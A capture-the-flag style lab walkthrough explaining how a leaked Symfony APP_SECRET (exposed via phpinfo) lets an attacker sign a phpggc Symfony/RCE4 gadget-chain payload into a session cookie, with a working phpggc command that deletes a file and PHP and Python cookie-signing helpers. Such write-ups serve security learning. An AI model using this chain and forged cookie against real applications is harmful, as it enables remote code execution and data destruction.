Exploiting PHP deserialization with a pre-built gadget chain

Lab Difficulty: Apprentice
Vulnerability: Insecure deserialization / PHP object injection (signed client-side objects) — leads to RCE with a pre-built gadget chain

Summary

This lab teaches a classic chain of real-world mistakes: the app stores PHP serialized objects client-side in a cookie, signs them with a server secret, and — crucially — the app leaks that secret (via phpinfo). With the secret you can sign a malicious serialized object (generated with phpggc for the target framework) and the server will unserialize it — which triggers a gadget chain and runs arbitrary commands. The lab walks you through finding the secret, building the payload, signing the token, and getting RCE (delete morale.txt).

Safety: only do this on labs/targets you’re authorized to test.

Steps taken (what I actually did — step‑by‑step, casual)

Log in as the user provided: wiener : peter. Capture a request with the session cookie using Burp.

Copy the cookie value out so we can inspect it.

Inspect the cookie format.

URL‑decode the cookie → it’s JSON like:

{"token":"<BASE64_SERIALIZED_OBJECT>","sig_hmac_sha1":"<HMAC_SHA1_SIGNATURE>"}


Base64‑decode the token → it’s a PHP serialized object (starts with O: etc).

If you tamper with the token and keep the old signature, the server rejects it — signature mismatch. So we need a valid signature for any token we send.

Find the secret.

The app exposes /cgi-bin/phpinfo.php. Open it and look for environment/config vars — there’s the Symfony APP_SECRET (the signing key). Nice sloppy dev mistake. With that secret we can compute the HMAC the server expects.

Pick the gadget chain and generate a payload.

The lab uses Symfony and instructs to use phpggc’s Symfony/RCE4 chain.

Using phpggc:

./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64


That produces the Base64 string you’ll use as the token value.

Compute a valid signature.

Signature = hash_hmac('sha1', <BASE64_TOKEN>, <SECRET>).

Example PHP helper (replace the values):

<?php
$object = "<BASE64_FROM_PHPGGC>";
$secretKey = "<APP_SECRET_FROM_PHPINFO>";
echo urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');


Or Python alternative:

import hmac, hashlib, urllib.parse
object_b64 = "<BASE64_FROM_PHPGGC>"
secret = "<APP_SECRET>"
sig = hmac.new(secret.encode(), object_b64.encode(), hashlib.sha1).hexdigest()
cookie = urllib.parse.quote('{"token":"%s","sig_hmac_sha1":"%s"}' % (object_b64, sig))
print(cookie)


Replace the session cookie and send the request.

Paste the printed URL‑encoded JSON into the session cookie in Burp and forward the request.

If everything’s right, the server verifies the signature, calls unserialize() on the token, the gadget chain executes, and the command runs (in this lab it deletes /home/carlos/morale.txt).

Verify success.

Lab confirms the file deletion — job done.

Root cause

The server unserializes data that originally came from the client. unserialize() can instantiate classes and run magic methods (__wakeup, __destruct, etc.).

The server relied on an HMAC to prove the token’s origin — but the secret was leaked (phpinfo) so the attacker can compute valid signatures.

Large frameworks contain classes that, when chained together, lead to execution — phpggc packages those gadget chains so you don’t have to craft them manually.

Combination = signed client-side serialized objects + leaked secret + gadget classes present = RCE.
